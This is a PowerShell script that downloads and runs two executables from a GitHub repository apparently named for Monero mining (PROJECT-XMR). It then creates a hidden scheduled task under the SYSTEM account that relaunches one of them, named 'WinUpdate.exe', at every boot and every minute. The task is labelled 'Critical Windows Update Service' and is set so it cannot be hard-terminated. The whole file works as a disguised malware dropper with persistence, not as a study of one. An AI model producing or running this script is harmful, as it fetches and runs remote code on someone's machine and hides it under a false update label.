[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::tls11

Invoke-WebRequest -Uri https://raw.githubusercontent.com/PH03N1X1000/PROJECT-XMR/main/Trial.exe -OutFile C:\Trial.exe
Start-Process -FilePath C:\Trial.exe -Wait

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::tls11
Invoke-WebRequest -Uri https://raw.githubusercontent.com/PH03N1X1000/PROJECT-XMR/main/WinUpdate.exe -OutFile C:\Windows\Temp\WinUpdate.exe
Start-Process -FilePath C:\Windows\Temp\WinUpdate.exe -Wait

$taskXML = @"
<?xml version='1.0' encoding='UTF-16'?>
<Task version='1.4' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
  <RegistrationInfo>
    <Author>SYSTEM</Author>
    <Description>Critical Windows Update Service</Description>
    <URI>\WinUpdate</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <TimeTrigger>
      <Repetition><Interval>PT1M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
      <StartBoundary>2024-02-04T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id='Author'>
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>0</Priority>
  </Settings>
  <Actions Context='Author'><Exec><Command>C:\Windows\Temp\WinUpdate.exe</Command></Exec></Actions>
</Task>
"@

$taskName = "WinUpdate"
$taskXML | Out-File -FilePath "C:\Windows\Temp\WinUpdate.xml" -Encoding unicode
schtasks /Create /XML "C:\Windows\Temp\WinUpdate.xml" /TN $taskName
